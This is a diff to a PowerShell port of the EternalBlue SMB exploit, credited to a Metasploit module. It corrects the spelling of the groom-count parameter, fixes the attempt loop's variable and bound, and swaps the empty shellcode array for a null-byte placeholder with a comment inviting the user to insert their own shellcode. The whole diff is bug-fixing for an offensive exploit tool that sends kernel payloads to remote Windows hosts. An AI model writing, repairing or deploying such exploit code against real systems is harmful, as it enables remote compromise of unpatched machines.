@@ -1,7 +1,7 @@
 ## Based on Eternal Blue metasploit module by Sean Dillon <sean.dillon@risksense.com>',  # @zerosum0x0 'Dylan Davis <dylan.davis@risksense.com>',  # @jennamagius
 
 
-function Invoke-EternalBlue($target, $inital_grooms,$max_attempts){
+function Invoke-EternalBlue($target, $initial_grooms,$max_attempts){
 
 $enc = [system.Text.Encoding]::ASCII
 
@@ -616,9 +616,9 @@ function smb1_free_hole($start) {
 
 function smb_eternalblue($target, $grooms) {
 
-       #Put your shellcode here
-    [Byte[]]  $payload = [Byte[]]()
 
+    #replace null bytes with your shellcode
+    [Byte[]]  $payload = [Byte[]](0x00,0x00,0x00)
   
     $shellcode = make_kernel_user_payload($payload)
     $payload_hdr_pkt = make_smb2_payload_headers_packet
@@ -683,7 +683,7 @@ function smb_eternalblue($target, $grooms) {
 
 
 $VerbosePreference = "continue"
-for ($i=0; $i -le $max_attemps; $i++) {
+for ($i=0; $i -lt $max_attempts; $i++) {
     $grooms = $initial_grooms + $GROOM_DELTA*$i 
     smb_eternalblue $target $grooms 
 }
